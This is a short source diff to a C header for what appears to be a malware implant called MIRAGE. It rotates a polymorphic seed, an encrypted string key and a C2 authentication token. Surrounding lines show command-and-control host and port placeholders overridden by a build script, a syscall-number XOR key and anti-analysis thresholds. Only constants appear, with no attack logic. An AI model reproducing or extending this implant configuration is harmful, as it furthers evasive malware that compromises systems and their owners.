@@ -17,11 +17,11 @@ char *mi_strdup(const char *s);
 
 /* ═══════ Crypto Constants ═══════════════════════════════════════ */
 
-#define MIRAGE_SEED            0x54EE1EF6
+#define MIRAGE_SEED            0xAD75E594
 #define MIRAGE_SSN_XOR_KEY     0xA3B5C7D9
 
 static const unsigned char MIRAGE_STRING_KEY_ENC[16] = {
-    0xaf, 0xa4, 0xb1, 0x68, 0x2e, 0x74, 0xab, 0xb7, 0x3d, 0x9c, 0xb7, 0x90, 0x24, 0x7c, 0x97, 0x56   /* polymorphic */
+    0xb7, 0xfd, 0x48, 0xe9, 0x11, 0x15, 0x51, 0x12, 0x72, 0xaf, 0x9b, 0xf5, 0xd9, 0x25, 0x63, 0xe1
 };
 /* ═══════ Anti-Analysis Thresholds ═══════════════════════════════ */
 
@@ -169,7 +169,7 @@ static const unsigned char MIRAGE_STRING_KEY_ENC[16] = {
 /* Build-time placeholder — overridden by make_polymorphic.py */
 #define C2_HOST                "127.0.0.1"
 #define C2_PORT                9999
-#define C2_TOKEN               "4fb2b055e3ce210592f718548248d7cf"
+#define C2_TOKEN               "e5a9e154ab67421cf2227dc8912ef32c"
 
 /* ═══════ Certificate Pinning ═══════════════════════════════════ */
 /* L1: CERT_PIN_HASH is all-zero — pinning is a no-op until a real SPKI hash is set at build time.
